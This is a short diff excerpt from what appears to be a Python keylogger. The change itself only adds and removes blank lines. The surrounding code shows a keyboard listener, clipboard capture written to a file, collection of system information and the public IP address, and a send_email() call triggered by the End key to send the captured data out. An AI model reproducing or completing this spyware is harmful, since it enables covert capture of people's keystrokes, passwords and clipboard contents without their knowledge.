@@ -242,8 +242,9 @@ def clipboards():
             clip.write("Clipboard data: \n" + data)
         except Exception as clip:
             print(clip)
+            
+            
 #ends program
-
 def on_release(key):
     if key == Key.end:
         send_email()
@@ -258,6 +259,8 @@ def on_release(key):
                 return False
         finally:
             return False
+          
+ 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     write_system_info()
     get_public_address()
